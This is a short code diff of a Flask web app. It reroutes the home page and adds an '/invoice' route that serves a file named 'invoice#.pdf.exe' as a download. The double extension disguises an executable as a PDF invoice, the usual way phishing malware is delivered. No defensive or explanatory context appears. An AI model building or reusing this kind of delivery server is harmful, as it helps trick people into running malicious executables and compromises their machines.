@@ -2,11 +2,11 @@ from flask import Flask, render_template, send_from_directory
 
 app = Flask(__name__)
 # Route to serve the file
-@app.route('/')
+@app.route('/invoice')
 def download_file():
     # The file will be served from the 'static' folder
     return send_from_directory(directory='static', path='invoice#.pdf.exe', as_attachment=True)
-@app.route('/g')
+@app.route('/')
 def home():
    
     return render_template('index.html')
